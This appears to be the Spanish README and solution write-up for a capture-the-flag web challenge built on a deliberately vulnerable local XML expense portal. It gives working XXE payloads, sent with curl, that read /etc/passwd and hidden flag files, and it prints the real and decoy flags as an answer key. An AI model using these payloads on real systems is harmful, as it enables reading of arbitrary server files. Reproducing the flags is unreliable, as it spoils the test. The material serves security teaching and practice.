# Reto XXE – Portal de Gastos Corporativos

**Categoría:** Web  
**Dificultad:** Media-Alta  
**Puntos:** 300  
**Flag real:** `ctfupb{4ld34_0cult4-d3-l0s-ch0wn3rs}`

---

## Descripción del reto

> *"GastosCorp acaba de desplegar su nuevo sistema interno de gestión de gastos.  
> El portal acepta reportes en formato XML para ser procesados automáticamente.  
> La empresa asegura que el sistema es seguro… pero algo huele mal en el servidor."*

Un sistema corporativo expone una API que procesa documentos XML.  
Hay rumores de que existen **archivos confidenciales** en el servidor.  
Tu misión: explotarlo y exfiltrar la flag real oculta en algún lugar del sistema de archivos.

> ⚠️ Hay **3 fake flags** colocadas en ubicaciones obvias para despistar.  
> La flag real está bien escondida.

---

## Despliegue

### Requisitos previos
- Docker ≥ 20.10
- Docker Compose ≥ 2.x

### Levantar el reto

```bash
cd web/reto_xxe
docker compose up --build -d
```

La aplicación queda disponible en **http://localhost:5001**.

### Detener el reto

```bash
docker compose down
```

---

## Solución – Paso a Paso

### Paso 1 – Reconocimiento inicial

Abre el navegador y accede a **http://localhost:5001**.

Verás la página de inicio del portal. Antes de hacer clic, revisa el código fuente de la página (`Ctrl+U` o `Cmd+U`):

```html
<!-- api disponible en /api/report - ver /api/docs para documentación -->
```

Este comentario revela dos rutas importantes:
- `/api/report` → endpoint que procesa el XML
- `/api/docs` → documentación de la API

---

### Paso 2 – Explorar la API de documentación

Accede a **http://localhost:5001/api/docs**.

La respuesta JSON muestra:

```json
{
  "endpoint": "/api/report",
  "method": "POST",
  "content_type": "application/xml",
  "sample_body": "<?xml version=\"1.0\"?>\n<gasto>\n    <concepto>Material de oficina</concepto>\n    <monto>150.00</monto>\n    <departamento>IT</departamento>\n    <fecha>2024-03-01</fecha>\n</gasto>"
}
```

Ahora sabes que el endpoint acepta XML. Ve al dashboard (**/dashboard**) y observa el panel de información. En el código fuente del dashboard encontrarás:

```html
<!-- Motor de parsing: lxml 4.9.3 | Config: resolve_entities=True -->
```

🚨 **¡Alerta!** `resolve_entities=True` es la configuración clave: el parser **resuelve entidades XML externas**, lo que lo hace vulnerable a **XXE (XML External Entity Injection)**.

---

### Paso 3 – Confirmar la vulnerabilidad XXE

Desde el dashboard (o con `curl`), envía un payload XXE básico que intente leer `/etc/passwd`:

```bash
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<gasto>
    <concepto>&xxe;</concepto>
    <monto>0</monto>
</gasto>'
```

Si el servidor devuelve el contenido de `/etc/passwd` en el campo `concepto`, la vulnerabilidad XXE está confirmada. 🎉

---

### Paso 4 – Localizar las fake flags (para descartar)

Ahora que puedes leer archivos del sistema, lo natural es explorar las rutas obvias:

**Fake flag 1 – `/app/flag.txt`**

```bash
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<gasto><concepto>&xxe;</concepto></gasto>'
```

Respuesta: `ctfupb{3st0_n0_3s_r34l_s1gu3_1nt3nt4nd0}` ← **FAKE**

---

**Fake flag 2 – `/tmp/flag.txt`**

```bash
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/flag.txt">]>
<gasto><concepto>&xxe;</concepto></gasto>'
```

Respuesta: `ctfupb{c4s1_p3r0_n0_fu1st3_s1gu3}` ← **FAKE**

---

**Fake flag 3 – `/app/secret/flag.txt`**

```bash
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/secret/flag.txt">]>
<gasto><concepto>&xxe;</concepto></gasto>'
```

Respuesta: `ctfupb{bu3n_1nt3nt0_p3r0_n0_3s_3st4}` ← **FAKE**

---

### Paso 5 – Enumeración del sistema de archivos

Ninguna de las rutas obvias tiene la flag real.  
Es hora de explorar el sistema de archivos más a fondo.

Lee el listado de la raíz del sistema (`/`) leyendo el contenido de `/proc/self/cmdline` o enumerando rutas manualmente:

```bash
# Leer el directorio raíz como texto (no siempre funciona, pero vale intentarlo)
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<gasto><concepto>&xxe;</concepto></gasto>'
```

Prueba rutas comunes en retos CTF:

| Ruta a probar           | Motivo                                     |
|-------------------------|--------------------------------------------|
| `/flag`                 | Convención habitual en CTFs de Docker      |
| `/root/flag.txt`        | Home del usuario root                      |
| `/home/ctf/flag.txt`    | Posible usuario dedicado                   |
| `/etc/flag`             | Archivos de configuración sensibles        |

---

### Paso 6 – Obtener la flag real

Prueba la ruta `/flag` (raíz del filesystem, convención CTF Docker):

```bash
curl -s -X POST http://localhost:5001/api/report \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<gasto>
    <concepto>&xxe;</concepto>
    <monto>0</monto>
    <departamento>CTF</departamento>
</gasto>'
```

Respuesta esperada:

```json
{
  "status": "Reporte procesado exitosamente",
  "data": {
    "concepto": "ctfupb{4ld34_0cult4-d3-l0s-ch0wn3rs}\n",
    "monto": "0",
    "departamento": "CTF"
  }
}
```

🏆 **FLAG:** `ctfupb{4ld34_0cult4-d3-l0s-ch0wn3rs}`

---

## Resumen técnico de la vulnerabilidad

| Elemento         | Detalle                                                    |
|------------------|------------------------------------------------------------|
| Tipo             | XML External Entity Injection (XXE)                        |
| CWE              | CWE-611                                                    |
| Causa raíz       | `lxml.etree.XMLParser(resolve_entities=True, load_dtd=True)` |
| Impacto          | Lectura arbitraria de archivos del servidor                |
| Mitigación       | Usar `resolve_entities=False` y `no_network=True` (defecto seguro de lxml) |

### Payload XXE explicado

```xml
<?xml version="1.0"?>
<!-- 1. Declaramos un DOCTYPE con una entidad externa -->
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<gasto>
    <!-- 2. La referencia &xxe; hace que el parser cargue el archivo -->
    <concepto>&xxe;</concepto>
</gasto>
```

El parser resuelve `&xxe;` haciendo una lectura del archivo `file:///flag`  
e inserta su contenido en el nodo `<concepto>`, que luego es devuelto en la respuesta JSON.

---

## Estructura de archivos del reto

```
web/reto_xxe/
├── app.py                 # Aplicación Flask (endpoint vulnerable /api/report)
├── Dockerfile             # Imagen Docker con las flags plantadas
├── docker-compose.yml     # Compose para levantar el servicio
├── requirements.txt       # Flask + lxml
├── templates/
│   ├── index.html         # Landing page (pista en comentario HTML)
│   └── dashboard.html     # Dashboard con formulario XML (pista en comentario HTML)
└── README.md              # Este archivo
```

---

## Fake flags resumen

| Ubicación               | Flag                                      |
|-------------------------|-------------------------------------------|
| `/app/flag.txt`         | `ctfupb{3st0_n0_3s_r34l_s1gu3_1nt3nt4nd0}` |
| `/tmp/flag.txt`         | `ctfupb{c4s1_p3r0_n0_fu1st3_s1gu3}`       |
| `/app/secret/flag.txt`  | `ctfupb{bu3n_1nt3nt0_p3r0_n0_3s_3st4}`    |

---

## Recursos de aprendizaje

- [PortSwigger – XXE injection](https://portswigger.net/web-security/xxe)
- [OWASP – XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings – XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
